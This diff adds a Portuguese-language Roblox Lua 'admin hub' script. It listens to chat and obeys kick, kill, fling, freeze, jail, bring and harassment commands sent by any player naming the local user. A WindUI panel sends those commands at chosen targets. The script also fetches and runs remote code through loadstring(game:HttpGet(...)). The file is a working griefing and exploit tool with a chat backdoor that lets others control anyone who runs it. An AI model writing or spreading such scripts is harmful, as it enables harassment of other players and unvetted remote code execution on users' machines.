@@ -1,0 +1,246 @@
+--// Serviços
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local TextChatService = game:GetService("TextChatService")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local Workspace = workspace
+
+--// Estados locais
+local playerOriginalSpeed = {}
+local jaulas = {}
+local jailConnections = {}
+local atrapalharConnections = {}
+
+--// Função util: cria tag visual (opcional)
+local function createSpecialTag(player)
+    if not player then return end
+    local function apply()
+        local char = player.Character
+        if not char then return end
+        local head = char:FindFirstChild("Head")
+        if not head then return end
+
+        local old = head:FindFirstChild("SpecialTag")
+        if old then old:Destroy() end
+
+        local gui = Instance.new("BillboardGui")
+        gui.Name = "SpecialTag"
+        gui.Size = UDim2.new(0, 200, 0, 50)
+        gui.StudsOffset = Vector3.new(0, 3, 0)
+        gui.AlwaysOnTop = true
+        gui.Adornee = head
+        gui.Parent = head
+
+        local text = Instance.new("TextLabel")
+        text.Size = UDim2.new(1,0,1,0)
+        text.BackgroundTransparency = 1
+        text.Font = Enum.Font.GothamBold
+        text.TextScaled = true
+        text.TextStrokeTransparency = 0.2
+        text.TextStrokeColor3 = Color3.new(0,0,0)
+        text.TextColor3 = Color3.fromRGB(255,255,255)
+        text.Text = ""
+        text.Parent = gui
+    end
+    pcall(apply)
+    player.CharacterAdded:Connect(function()
+        task.wait(0.4)
+        pcall(apply)
+    end)
+end
+
+--// Aplica tags iniciais
+for _, p in pairs(Players:GetPlayers()) do
+    createSpecialTag(p)
+end
+Players.PlayerAdded:Connect(function(p) createSpecialTag(p) end)
+
+--// Função para enviar comando pelo chat
+local function EnviarComando(comando, alvo)
+    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
+    if canal then
+        canal:SendAsync(";"..comando.." "..(alvo or ""))
+    end
+end
+
+--// Função que processa cada mensagem recebida
+local function ProcessarMensagem(msgText, authorName)
+    if not msgText or not authorName then return end
+    local comandoLower = msgText:lower()
+    local targetLower = LocalPlayer.Name:lower()
+    local character = LocalPlayer.Character
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+
+    -- COMANDOS
+    if comandoLower:match(";kick%s+"..targetLower) then
+        LocalPlayer:Kick("Você foi kickado via comando!")
+    end
+    if comandoLower:match(";kill%s+"..targetLower) then
+        if character then character:BreakJoints() end
+    end
+    if comandoLower:match(";fling%s+"..targetLower) then
+        if character then
+            local root = character:FindFirstChild("HumanoidRootPart")
+            if root then
+                local tween = TweenService:Create(root, TweenInfo.new(1), {CFrame=CFrame.new(0,100000,0)})
+                tween:Play()
+            end
+        end
+    end
+    if comandoLower:match(";freeze%s+"..targetLower) then
+        if humanoid then
+            playerOriginalSpeed[targetLower] = humanoid.WalkSpeed
+            humanoid.WalkSpeed = 0
+        end
+    end
+    if comandoLower:match(";unfreeze%s+"..targetLower) then
+        if humanoid then
+            humanoid.WalkSpeed = playerOriginalSpeed[targetLower] or 16
+        end
+    end
+    if comandoLower:match(";bring%s+"..targetLower) then
+        local success, err = pcall(function()
+            local sourcePlayer = Players:FindFirstChild(authorName)
+            if not sourcePlayer then return end
+            local sourceChar = sourcePlayer.Character
+            if not sourceChar then return end
+            local sourceRoot = sourceChar:FindFirstChild("HumanoidRootPart")
+            if not sourceRoot then return end
+            local myRoot = character:FindFirstChild("HumanoidRootPart")
+            if myRoot then
+                myRoot.CFrame = sourceRoot.CFrame * CFrame.new(0,0,2)
+            end
+        end)
+    end
+    if comandoLower:match(";jail%s+"..targetLower) then
+        if character then
+            local root = character:FindFirstChild("HumanoidRootPart")
+            if root then
+                local pos = root.Position
+                jaulas[targetLower] = {}
+                local color = Color3.fromRGB(255,140,0)
+                local function criarPart(cf,s)
+                    local p = Instance.new("Part")
+                    p.Size = s
+                    p.Anchored = true
+                    p.Position = cf.Position
+                    p.Color = color
+                    p.CanCollide = true
+                    p.Parent = Workspace
+                    table.insert(jaulas[targetLower], p)
+                end
+                criarPart(CFrame.new(pos + Vector3.new(5,0,0)), Vector3.new(1,10,10))
+                criarPart(CFrame.new(pos + Vector3.new(-5,0,0)), Vector3.new(1,10,10))
+                criarPart(CFrame.new(pos + Vector3.new(0,0,5)), Vector3.new(10,10,1))
+                criarPart(CFrame.new(pos + Vector3.new(0,0,-5)), Vector3.new(10,10,1))
+                criarPart(CFrame.new(pos + Vector3.new(0,5,0)), Vector3.new(10,1,10))
+                criarPart(CFrame.new(pos + Vector3.new(0,-5,0)), Vector3.new(10,1,10))
+                jailConnections[targetLower] = RunService.Heartbeat:Connect(function()
+                    if (root.Position - pos).Magnitude > 5 then
+                        root.CFrame = CFrame.new(pos)
+                    end
+                end)
+            end
+        end
+    end
+    if comandoLower:match(";unjail%s+"..targetLower) then
+        if jaulas[targetLower] then
+            for _, v in pairs(jaulas[targetLower]) do
+                if v and v.Destroy then pcall(v.Destroy, v) end
+            end
+            jaulas[targetLower] = nil
+        end
+        if jailConnections[targetLower] then
+            jailConnections[targetLower]:Disconnect()
+            jailConnections[targetLower] = nil
+        end
+    end
+
+    --// ATRAPALHAR PLAYER
+    if comandoLower:match(";atrapalhar%s+"..targetLower) then
+        local char = character
+        if not char then return end
+        local root = char:FindFirstChild("HumanoidRootPart")
+        if not root then return end
+
+        if atrapalharConnections[targetLower] then atrapalharConnections[targetLower]:Disconnect() end
+
+        atrapalharConnections[targetLower] = RunService.Heartbeat:Connect(function()
+            if root then
+                -- Jogar para cima
+                root.Velocity = Vector3.new(0,500,0)
+                -- Spin maluco
+                root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(500), 0)
+            end
+        end)
+    end
+end
+
+--// Conectar canais de chat
+local function ConectarCanal(canal)
+    if not canal or not canal.IsA then return end
+    if not canal:IsA("TextChannel") then return end
+    canal.MessageReceived:Connect(function(msg)
+        local text = msg.Text
+        local source = msg.TextSource and msg.TextSource.Name
+        if text and source then
+            ProcessarMensagem(text, source)
+        end
+    end)
+end
+for _, ch in pairs(TextChatService.TextChannels:GetChildren()) do ConectarCanal(ch) end
+TextChatService.TextChannels.ChildAdded:Connect(ConectarCanal)
+
+--// Painel WindUI
+local ok, WindUILib = pcall(function()
+    return loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+end)
+if ok and WindUILib then
+    local Window = WindUILib:CreateWindow({
+        Title = "Lcc Hub Painel Admin",
+        Icon = "star",
+        Author = "by Lcc_027",
+        Folder = "LccHubPainel",
+        Size = UDim2.fromOffset(580,460),
+        Transparent = true,
+        Resizable = false,
+        SideBarWidth = 200,
+        HideSearchBar = true,
+        ScrollBarEnabled = true,
+    })
+
+    local TabComandos = Window:Tab({Title="Scripts", Icon="terminal", Locked=false})
+    local Section = TabComandos:Section({Title="Admin", Icon="user-cog", Opened=true})
+
+    local function getPlayersList()
+        local t = {}
+        for _, p in ipairs(Players:GetPlayers()) do table.insert(t,p.Name) end
+        return t
+    end
+
+    local TargetName
+    local Dropdown = Section:Dropdown({
+        Title="Selecionar Jogador",
+        Values=getPlayersList(),
+        Value="",
+        Callback=function(opt) TargetName = opt end
+    })
+    Players.PlayerAdded:Connect(function() Dropdown:SetValues(getPlayersList()) end)
+    Players.PlayerRemoving:Connect(function() Dropdown:SetValues(getPlayersList()) end)
+
+    local comandos = {"kick","kill","fling","freeze","unfreeze","bring","jail","unjail","atrapalhar"}
+    for _, cmd in ipairs(comandos) do
+        Section:Button({
+            Title=cmd,
+            Desc="Comando ;"..cmd.." - Alvo",
+            Callback=function()
+                if TargetName and TargetName~="" then
+                    EnviarComando(cmd, TargetName)
+                else
+                    warn("Nenhum jogador selecionado!")
+                end
+            end
+        })
+    end
+end
